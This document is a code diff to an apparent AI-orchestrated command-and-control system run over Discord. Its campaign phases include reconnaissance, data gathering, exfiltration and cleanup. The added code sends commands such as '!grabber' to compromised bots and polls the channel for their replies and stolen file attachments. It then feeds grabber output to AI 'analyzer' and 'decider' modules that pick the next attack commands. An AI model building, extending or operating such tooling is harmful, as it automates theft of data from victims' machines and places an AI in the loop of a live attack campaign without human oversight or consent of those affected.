@@ -1,6 +1,8 @@
 import { aiContext } from './context.js'
 import { callAIWithFallback, parseAIResponse, getAvailableProviders } from './swarm.js'
 import { COMMAND_DEFS } from './commands.js'
+import { analyzeResults } from './analyzer.js'
+import { decideNextActions } from './decider.js'
 
 const PHASES = ['RECON', 'GATHER', 'EXFIL', 'CLEANUP', 'REPORT']
 const MAX_RETRIES_PER_PHASE = 3
@@ -211,26 +213,50 @@ class CampaignManager {
 
         if (channel && channel.isTextBased()) {
           const fullCmd = `${cmd.command} ${cmd.args || ''}`.trim()
+          const isGrabber = cmd.command === '!grabber'
           results.push(`[EXEC] Sending: ${fullCmd} — ${cmd.reason}`)
 
           const sent = await channel.send(fullCmd)
 
-          // Wait for response — collect messages in channel for 8s
-          await new Promise(r => setTimeout(r, 8000))
+          // Wait for response — poll for messages
+          const before = Date.now()
+          const timeout = isGrabber ? 120000 : 30000
+          const parts = []
+          while ((Date.now() - before) < timeout) {
+            const msgs = await channel.messages.fetch({ limit: 10 })
+            for (const [, m] of msgs) {
+              if (!m.author.bot || !m.content) continue
+              if (m.id === sent.id) continue
+              if (m.content.includes(':heartbeat:') || m.content.includes('**Alive**')) continue
+              if (m.createdTimestamp < before - 3000) continue
+              const attachments = m.attachments.map(a => `[FILE: ${a.name}]`).join(' ')
+              const text = (attachments ? m.content + ' ' + attachments : m.content).slice(0, 1000)
+              if (!parts.some(p => p.includes(text.slice(0, 80)))) {
+                parts.push(text)
+              }
+            }
+            if (parts.length > 0) {
+              await new Promise(r => setTimeout(r, 3000))
+            } else {
+              await new Promise(r => setTimeout(r, 2000))
+            }
+          }
 
-          const messages = await channel.messages.fetch({ limit: 5 })
-          // Collect messages AFTER our command (ignore the command itself)
-          const replies = messages.filter(m =>
-            m.id !== sent.id &&
-            (m.author.id !== client.user.id || m.content.startsWith(':')
-          ))
-          if (replies.size > 0) {
-            for (const [, reply] of replies) {
-              const content = reply.content.replace(/\n/g, ' | ')
-              results.push(`[RESULT] ${content.slice(0, 300)}`)
+          const combined = parts.join('\n')
+          if (combined) {
+            results.push(`[RESULT] ${combined.slice(0, 3000)}`)
+            if (isGrabber) {
+              try {
+                const analysis = await analyzeResults(combined, null)
+                results.push(`[ANALYZER] ${analysis.summary || 'Analysis complete'}`)
+                const decision = await decideNextActions(analysis, null)
+                if (decision.commands?.length) {
+                  results.push(`[DECIDER] Next actions: ${decision.commands.map(c => c.command + (c.args ? ' ' + c.args : '')).join(', ')}`)
+                }
+              } catch {}
             }
           } else {
-            results.push(`[RESULT] No response captured in window`)
+            results.push(`[RESULT] No response captured`)
           }
         } else {
           results.push(`[EXEC] ${cmd.command} ${cmd.args || ''} — ${cmd.reason}`)
